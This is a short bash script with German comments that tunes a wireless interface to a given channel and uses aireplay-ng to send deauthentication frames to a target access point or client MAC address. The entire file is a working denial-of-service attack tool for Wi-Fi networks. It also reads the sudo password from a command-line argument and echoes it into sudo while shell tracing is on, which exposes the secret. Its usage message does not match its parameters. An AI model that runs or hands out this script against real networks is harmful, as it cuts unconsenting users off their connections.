#!/bin/bash

set -x 
# -----------------------------------------------------------------------------
# 0) Parameter prüfen
# -----------------------------------------------------------------------------
INTERFACE="$1"              # z.B. wlan0
TARGET_MAC="$2"             # BSSID oder Client-MAC, z.B. AA:BB:CC:DD:EE:FF
PACKETS="$3"                
CHANNEL="$4"         
SECRET="$5"                 # sudo-Passwort

if [[ -z "$INTERFACE" || -z "$TARGET_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
echo "Usage: $0  <ap_mac> <client_mac>  [packets] "
exit 1
fi

if ! ip link show "$INTERFACE" &>/dev/null; then
echo "Interface $INTERFACE nicht gefunden"
exit 1
fi
echo "[i] Deaktiviere Energiesparen"
echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off || true

echo "[i] Setze Interface $INTERFACE auf Kanal $CHANNEL"
echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL" 
sleep 1

# -----------------------------------------------------------------------------
# 4) Deauth-Pakete senden
# -----------------------------------------------------------------------------
echo "[i] Sende $PACKETS Deauth-Pakete an $TARGET_MAC auf Kanal $CHANNEL"
echo "$SECRET" | sudo -S aireplay-ng -0 "$PACKETS" -a "$TARGET_MAC" "$INTERFACE"

# Script Ende
exit 0

